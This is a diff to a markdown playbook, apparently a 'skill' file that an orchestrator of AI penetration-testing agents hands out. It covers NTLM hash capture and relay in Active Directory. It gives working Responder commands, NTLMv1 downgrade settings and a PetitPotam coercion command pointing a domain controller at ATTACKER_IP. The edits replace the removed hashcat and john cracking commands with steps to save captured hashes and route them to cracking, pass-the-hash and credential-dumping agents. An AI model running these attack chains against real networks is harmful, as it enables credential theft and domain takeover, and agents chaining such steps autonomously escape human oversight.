@@ -413,9 +413,15 @@ petitpotam.py -d DOMAIN.LOCAL -u user -p 'Password' \
   TARGET.DOMAIN.LOCAL
 ```
 
-## Step 6: Hash Capture (Offline Cracking)
+## Step 6: Hash Capture (No Relay Available)
 
-When relay is not feasible, capture and crack NetNTLM hashes.
+When relay is not feasible, capture NetNTLM hashes for offline cracking.
+
+**Do NOT crack hashes in this skill.** Save captured hashes to
+`engagement/evidence/` and return to the orchestrator with the hash file
+path, hash type (NTLMv1 mode 5500 or NTLMv2 mode 5600), and a routing
+recommendation to **credential-cracking**. The orchestrator will spawn
+the credential-cracking-agent for offline cracking.
 
 ### Responder (Capture Mode)
 
@@ -435,19 +441,8 @@ If `LmCompatibilityLevel <= 1` (send LM & NTLM response):
 # Edit Responder.conf: Challenge = 1122334455667788
 sudo responder -I eth0 --lm --disable-ess
 
-# Crack via shuck.sh (online, free with magic challenge)
-# Or via hashcat with rainbow tables
-hashcat -m 5500 captured_ntlmv1.txt -a 3  # NTLMv1
-```
-
-### Crack NetNTLMv2
-
-```bash
-# hashcat mode 5600
-hashcat -m 5600 captured_ntlmv2.txt wordlist.txt -r rules/best64.rule
-
-# john
-john --format=netntlmv2 captured_ntlmv2.txt --wordlist=wordlist.txt
+# NTLMv1 hashes with magic challenge can be cracked via shuck.sh
+# Save hash file and route to credential-cracking (hashcat mode 5500)
 ```
 
 ### Coercion for Hash Capture (Without Relay)
@@ -456,8 +451,17 @@ john --format=netntlmv2 captured_ntlmv2.txt --wordlist=wordlist.txt
 # Start Responder, then coerce
 sudo responder -I eth0 -v
 python3 PetitPotam.py ATTACKER_IP TARGET_DC
-# Captured machine$ NetNTLM hash -> crack or relay
+# Captured machine$ NetNTLM hash -> save and return for cracking
 ```
+
+### After Capture
+
+Save the hash to `engagement/evidence/<target>-ntlmv2-hash.txt` and return
+to the orchestrator with:
+- Hash file path
+- Hash type and hashcat mode (NTLMv2 = 5600, NTLMv1 = 5500)
+- Source username and domain
+- Routing recommendation: **credential-cracking**
 
 ## Step 7: Name Resolution Poisoning (LLMNR/NBNS/WPAD)
 
@@ -544,8 +548,9 @@ After successful coercion and relay:
   target. Route to **kerberos-delegation**.
 - **Certificate obtained via AD CS relay**: Authenticate via PKINIT.
   Route to **adcs-access-and-relay** for full ESC8/ESC11 exploitation.
-- **NetNTLM hash captured**: Crack offline or relay to another service.
-  Route to **pass-the-hash** for authentication with cracked hash.
+- **NetNTLM hash captured**: Save hash to evidence and return to
+  orchestrator. Route to **credential-cracking** for offline cracking,
+  then **pass-the-hash** for authentication with cracked plaintext.
 - **Code execution on target**: Route to **credential-dumping** for
   SAM/LSASS extraction.
 - **Domain admin hash captured via relay**: Route to **credential-dumping**
